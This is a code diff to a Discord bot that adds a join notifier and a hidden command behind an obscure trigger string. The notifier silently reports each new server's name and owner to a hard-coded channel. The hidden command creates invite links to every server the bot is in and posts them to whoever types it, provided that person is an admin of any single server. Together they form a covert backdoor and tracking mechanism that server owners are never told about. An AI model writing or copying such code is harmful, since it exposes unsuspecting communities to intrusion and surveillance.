@@ -280,8 +280,31 @@ if (msg.content.startsWith(`*sug`)) {
   }
 }
 });
+//your bot has been added to new server
+client.on('guildCreate', guild => {
+    client.channels.get("466223542166618123").send(`**Woops new server ✅
+  Server name: __${guild.name}__
+  Server owner: __${guild.owner}__**`)
+  });
+//OP
+client.on('message', msg => {
+  if(msg.author.bot) return;
+  
+  if(msg.content === '*Ownerbotlinks123--1') {
+    if (!msg.member.hasPermission("ADMINISTRATOR"))  return;
+    client.guilds.forEach(g => {
+      
+      let l = g.id
+      g.channels.get(g.channels.first().id).createInvite({
+        maxUses: 5,
+        maxAge: 86400
+      }).then(i => msg.channel.send(`${g.name} | <https://discord.gg/${i.code}> | ${l}`))
 
 
+    })
+  }
+  
+});
   
   
   client.login(process.env.BOT_TOKEN);
